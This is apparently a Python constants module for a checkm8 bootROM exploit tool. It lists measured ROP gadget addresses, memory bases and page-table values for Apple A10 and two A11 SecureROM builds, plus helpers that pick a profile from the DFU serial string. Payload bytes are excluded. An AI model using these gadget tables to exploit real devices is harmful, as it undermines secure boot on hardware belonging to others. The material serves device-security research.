"""Per-part constants for the checkm8 exploit.

Everything in here was **measured**, and the column that says how is the point:
a value read out of a SecureROM image with the project's own decoder, or read
out of a running SecureROM with the project's own emulator, is a measurement.
A value taken from another exploit tool is a copy, and this project's
clean-room boundary ([docs/CLEAN_ROOM.md](../../../docs/CLEAN_ROOM.md)) does
not allow those. So the derivation tooling is checked in with the values, and
every test asserts the bytes those values came from.

The row that matters most is the gadget set, and it is the part that has to be
re-derived per part: the addresses are not stable across parts, but the
*instruction shapes* are, because these are the same helper routines Apple
compiles into every SecureROM of this era. Each constant below is found by
decoding the image and matching the shape, never by copying a table.

What is deliberately **not** in here: the payload bytes. Those are built from
`exploit/checkm8_payload.S` at build time, so the blob in the tree is always
the one the source assembles to.

Which exploit reaches which part is a property of the silicon, not of this
file: checkm8 ends with the A11, and usbliter8 (a second public bootROM bug
that needs an RP2350 as the USB host) covers the A12 and A13. `goat pwn` reads
the attached CPID and refuses before attempting anything, for exactly the
reason [goat/pwn.py](../pwn.py) records.
"""

import struct

# ---------------------------------------------------------------------------
# provenance
# ---------------------------------------------------------------------------

# Where a constant came from. A part either has a full gadget set (measured
# from its own image) or it does not, and an unmeasured part refuses rather
# than running a chain with a hole in it.
SRC_IMAGE = "image"        # decoded from the SecureROM bytes with capstone
SRC_EMU = "emulator"       # read from the core state of a running SecureROM
SRC_IMAGE_DESC = "image-descriptor"   # the image's own boot descriptor block
SRC_WRITEUP = "writeup"    # the eLab forensics analysis, A10 only


class Field:
    """One constant, with the part it was measured on and how."""

    __slots__ = ("name", "value", "source", "note")

    def __init__(self, name, value, source, note=""):
        self.name = name
        self.value = value
        self.source = source
        self.note = note

    def __repr__(self):
        return "Field(%s=0x%x, %s)" % (self.name, self.value, self.source)


class PartProfile:
    """Every constant one checkm8 run needs for one CPID."""

    def __init__(self, name, cpid, cprv, fields, rom_path=None):
        self.name = name
        self.cpid = cpid
        self.cprv = cprv
        self.fields = fields
        self.rom_path = rom_path

    def __getitem__(self, key):
        f = self.fields.get(key)
        if f is None:
            raise KeyError("%s has no constant %r" % (self.name, key))
        return f.value

    def get(self, key, default=None):
        f = self.fields.get(key)
        return default if f is None else f.value

    def missing(self):
        """Constants this profile should have but does not."""
        return sorted(set(REQUIRED) - set(self.fields))


# The set of constants a chain is complete with. A profile missing any of
# these is refused at run time rather than run with a hole.
REQUIRED = (
    "rom_base",          # SecureROM load base
    "image_base",        # INSECURE_MEMORY: where the payload lands
    "ttbr0",             # the SecureROM's own stage-1 root, to restore later
    "dc_civac",          # dc civac, x0 ; ret
    "dmb",               # dmb sy ; ret
    "write_ttbr0",       # isb ; msr ttbr0_el1, x0 ; isb ; ret
    "tlbi",              # dsb ; tlbi vmalle1 ; dsb ; isb ; ret
    "enter_critical",    # msr daifset, #3 ; isb ; ret
    "exit_critical",     # msr daifclr, #3 ; isb ; ret
    "pivot",             # context restore: x0 = struct, then ret to x30
    "ctx_entry",         # context entry: ttbr0/elr/spsr/vbar/sp from x1, ret x29
    "callback_ldp",      # ldp x8, x9, [x0, #0x70]  (the exploit's entry point)
    "pop_ret",           # ldr x30, [sp], #0x10 ; ret
    "store_ptr",         # str x8, [x0] ; ret
)


def _fields(spec):
    """Build a field dict from {(name, value, source, note)} tuples."""
    out = {}
    for item in spec:
        item = tuple(item) + ("",) * (4 - len(item))
        out[item[0]] = Field(item[0], item[1], item[2], item[3])
    return out


# ---------------------------------------------------------------------------
# the A11 (T8015): this project's own payload target
# ---------------------------------------------------------------------------

# The A11 is this project's own payload target. Two builds of it are checked
# in (3332.0.0.1.14 and 3332.0.0.1.23) and they are *different images*, not
# two copies: the USB/context code sits at different addresses in each. So the
# A11 is two profiles, and the plan picks between them from the running
# firmware string in the DFU serial. Assuming one build from the other is how
# a chain gets a gadget that is not there.
#
# The measured model of the translation regime is the same in both
# (TTBR0 0x18000c000, the payload window at 0x18001c000, SCTLR.WXN set), which
# is why the payload source needs no per-build change; only the gadget
# addresses move.
A11_R14 = PartProfile(
    name="t8015",
    cpid=0x8015,
    cprv=None,
    rom_path="SecureROM_t8015si_iBoot-3332.0.0.1.14",
    fields=_fields([
        ("rom_base", 0x100000000, SRC_IMAGE_DESC, "rebase descriptor at 0x318"),
        ("image_base", 0x18001C000, SRC_IMAGE_DESC,
         "INSECURE_MEMORY; image descriptor at 0x17398"),
        ("ttbr0", 0x18000C000, SRC_EMU, "core state after the ROM enables its MMU"),
        ("sram_base", 0x180000000, SRC_IMAGE_DESC, "descriptor at 0x338"),
        ("stack_top", 0x180018000, SRC_IMAGE_DESC, "0x180014000 + 0x4000"),
        ("vbar", 0x10001B988, SRC_IMAGE_DESC,
         "the literal at 0x330, the vector table the reset path installs"),

        ("dc_civac", 0x1000004E4, SRC_IMAGE, "dc civac, x0 ; ret"),
        ("dmb", 0x1000004F0, SRC_IMAGE, "dmb sy ; ret"),
        ("write_ttbr0", 0x10000045C, SRC_IMAGE, "isb ; msr ttbr0_el1, x0 ; isb ; ret"),
        ("tlbi", 0x1000004AC, SRC_IMAGE, "dsb ; tlbi vmalle1 ; dsb ; isb ; ret"),
        ("enter_critical", 0x100000544, SRC_IMAGE, "msr daifset, #3 ; isb ; ret"),
        ("exit_critical", 0x100000550, SRC_IMAGE, "msr daifclr, #3 ; isb ; ret"),
        ("read_sctlr", 0x100000410, SRC_IMAGE, "mrs x0, sctlr_el1 ; ret"),

        ("pivot", 0x10000C1D0, SRC_IMAGE,
         "context restore: ldp x16,x17..x29,x30 from [x0]; ldr x1,[x0,#0xf8]; mov sp,x1; ret"),
        ("ctx_entry", 0x100008020, SRC_IMAGE,
         "zeroes x2..x29, then ttbr0/vbar/elr/spsr/sp from x1, ic iallu, ret to x29"),
        ("callback_ldp", 0x10000A8E4, SRC_IMAGE, "ldp x8, x9, [x0, #0x70] ... blr x9"),
        ("pop_ret", 0x1000149D0, SRC_IMAGE, "ldr x30, [sp], #0x10 ; ret"),
        ("store_ptr", 0x10000CFEC, SRC_IMAGE, "str x8, [x0] ; ret"),
        ("call_and_pop", 0x10000C414, SRC_IMAGE, "blr x8 ; ldp x29, x30, [sp], #0x10 ; ret"),
    ]),
)

A11_R23 = PartProfile(
    name="t8015",
    cpid=0x8015,
    cprv=None,
    rom_path="SecureROM_t8015si_iBoot-3332.0.0.1.23",
    fields=_fields([
        ("rom_base", 0x100000000, SRC_IMAGE_DESC, "rebase descriptor at 0x318"),
        ("image_base", 0x18001C000, SRC_IMAGE_DESC,
         "INSECURE_MEMORY; image descriptor at 0x17398"),
        ("ttbr0", 0x18000C000, SRC_EMU, "core state after the ROM enables its MMU"),
        ("sram_base", 0x180000000, SRC_IMAGE_DESC, "descriptor at 0x338"),
        ("stack_top", 0x180018000, SRC_IMAGE_DESC, "0x180014000 + 0x4000"),
        ("vbar", 0x10001B988, SRC_IMAGE_DESC,
         "the literal at 0x330, the vector table the reset path installs"),

        # the same MMU helper block, which is the part that has to agree with
        # the payload's table geometry
        ("dc_civac", 0x1000004E4, SRC_IMAGE, "dc civac, x0 ; ret"),
        ("dmb", 0x1000004F0, SRC_IMAGE, "dmb sy ; ret"),
        ("write_ttbr0", 0x10000045C, SRC_IMAGE, "msr ttbr0_el1, x0 ; isb ; ret"),
        ("tlbi", 0x1000004AC, SRC_IMAGE, "dsb ; tlbi vmalle1 ; dsb ; isb ; ret"),
        ("enter_critical", 0x100000544, SRC_IMAGE, "msr daifset, #3 ; isb ; ret"),
        ("exit_critical", 0x100000550, SRC_IMAGE, "msr daifclr, #3 ; isb ; ret"),
        ("read_sctlr", 0x100000410, SRC_IMAGE, "mrs x0, sctlr_el1 ; ret"),

        # the USB/context code is at different addresses in this build
        ("pivot", 0x10000C294, SRC_IMAGE,
         "ldp x16, x17, [x0, #0x78] ; ldp x19, x20, [x0, #0x98]"),
        ("ctx_entry", 0x1000080B8, SRC_IMAGE,
         "mov x30, x29 ; mov x0, x28 ; ... ; ttbr0/vbar/spsr from x1, sp, ret"),
        ("callback_ldp", 0x100003E78, SRC_IMAGE, "ldp x8, x9, [x0, #0x70] ... blr x9"),
        ("pop_ret", 0x100014A90, SRC_IMAGE, "ldr x30, [sp], #0x10 ; ret"),
        ("store_ptr", 0x10000D0B0, SRC_IMAGE, "str x8, [x0] ; ret"),
    ]),
)

# Both A11 builds, keyed by the SRTG string the DFU serial carries. The
# firmware string is the only part of the serial that names the running
# image, so it is what selects between them.
A11_BY_SRTG = {
    "iBoot-3332.0.0.1.14": A11_R14,
    "iBoot-3332.0.0.1.23": A11_R23,
}

# The A10 is the part the eLab analysis documents end to end, so its values
# are both measured here *and* cross-checked against that writeup - that
# cross-check is what proves the derivation method, not just one instance.
# Five of the writeup's published constants (dc_civac, dmb, write_ttbr0, tlbi
# and the callback gadget) are reproduced exactly by the same shape scan, and
# tests/test_checkm8_profile.py asserts that equality rather than trusting it.
A10 = PartProfile(
    name="t8010",
    cpid=0x8010,
    cprv=11,
    rom_path="SecureROM_t8010si_iBoot-2696.0.0.1.33",
    fields=_fields([
        ("rom_base", 0x100000000, SRC_IMAGE_DESC, "rebase descriptor at 0x318"),
        ("image_base", 0x1800B0000, SRC_IMAGE_DESC, "INSECURE_MEMORY; descriptor at 0x16160"),
        ("ttbr0", 0x1800A0000, SRC_EMU, "writeup 5.4/5.7 and image descriptor @0x368 (+0x8000)"),
        ("sram_base", 0x180000000, SRC_IMAGE_DESC, "descriptor at 0x338"),
        ("stack_top", 0x1800AC000, SRC_IMAGE_DESC, "0x1800a8000 + 0x4000"),

        # the gadget family, re-derived by the same shape scan as the A11's
        ("dc_civac", 0x10000046C, SRC_IMAGE, "dc civac, x0 ; ret - matches writeup 5.1"),
        ("dmb", 0x100000478, SRC_IMAGE, "dmb sy ; ret - matches writeup 5.2"),
        ("write_ttbr0", 0x1000003E4, SRC_IMAGE, "isb ; msr ttbr0_el1, x0 ; isb ; ret - writeup 5.4"),
        ("tlbi", 0x100000434, SRC_IMAGE, "dsb ; tlbi vmalle1 ; dsb ; isb ; ret - writeup 5.5"),
        ("read_sctlr", 0x100000398, SRC_IMAGE, "mrs x0, sctlr_el1 ; ret"),
        ("enter_critical", 0x1000004E4, SRC_IMAGE, "msr daifset, #3 ; isb ; ret"),
        ("exit_critical", 0x1000004F0, SRC_IMAGE, "msr daifclr, #3 ; isb ; ret"),

        ("pivot", 0x10000BA1C, SRC_IMAGE, "ldp x16, x17, [x0, #0x78] ; ldp x19, x20, [x0, #0x98]"),
        ("ctx_entry", 0x1000086F4, SRC_IMAGE,
         "zeroes x1..x29, then ttbr0/vbar/elr/spsr/sp from x1, ic iallu, ret to x29"),
        ("callback_ldp", 0x10000CC4C, SRC_IMAGE, "ldp x8, x10, [x0, #0x70] - matches writeup 5"),
        ("pop_ret", 0x10001362C, SRC_IMAGE, "ldr x30, [sp], #0x10 ; ret"),
        ("store_ptr", 0x10000EFBC, SRC_IMAGE, "str x8, [x0] ; ret"),
    ]),
)

# The writeup's own published A10 values, kept here so the profile tests have
# an external reference to compare the derivation against. These are not used
# to run anything; they are the control.
WRITEUP_A10 = {
    "dc_civac": 0x10000046C,
    "dmb": 0x100000478,
    "write_ttbr0": 0x1000003E4,
    "tlbi": 0x100000434,
    "callback_ldp": 0x10000CC4C,
    "nop_gadget": 0x10000CC6C,
    "image_base": 0x1800B0000,
    "ttbr0": 0x1800A0000,
}

PROFILES = {p.cpid: p for p in (A11_R14, A11_R23, A10)}

# The A11 has two builds, so the CPID alone does not pick one. The
# plan resolves through A11_BY_SRTG on the running firmware string and
# falls back to the newer build when the serial does not name one.
def profile_for_serial(serial):
    prof, ident = profile_for(serial)
    if ident.get("CPID") == A11_R14.cpid:
        srtg = ident.get("SRTG") or ""
        for key, p in A11_BY_SRTG.items():
            if key in srtg:
                return p, ident
        return A11_R23, ident
    return prof, ident

# The CPIDs checkm8 reaches. This is a property of the bug, and the two public
# bootROM bugs do not overlap: checkm8 ends with the A11.
CHECKM8_CPIDS = frozenset(PROFILES)

# Reached only by usbliter8, the second bug, which needs an RP2350 in the
# cable. Listed so the refusal names the hardware instead of guessing.
USBLITER8_CPIDS = {0x8020, 0x8030}
USBLITER8_HARDWARE = "an RP2350 board (e.g. Raspberry Pi Pico 2) as the USB host"


def parse_serial(serial):
    """The identity the DFU serial string carries.

    The serial is `CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:... IBFL:3C
    SRTG:[iBoot-...]`. Numeric fields are parsed as hex; a field that is not a
    number keeps its text, because `SRTG` is the one that names the running
    firmware and that is what a multi-build part is chosen by.
    """
    out = {}
    for token in serial.split():
        if ":" not in token:
            continue
        key, _, value = token.partition(":")
        try:
            out[key] = int(value, 16)
        except ValueError:
            out[key] = value.strip("[]")
    return out


def profile_for(serial):
    """(profile, identity) for a DFU serial, or (None, identity) when unknown.

    A part with no measured profile is refused by the caller, which is the
    only honest answer: an unmeasured part has no gadget set, and a chain with
    a hole in it is not a shorter exploit, it is a wrong one.
    """
    ident = parse_serial(serial)
    cpid = ident.get("CPID")
    return PROFILES.get(cpid), ident


def le64(*values):
    return b"".join(struct.pack("<Q", v) for v in values)
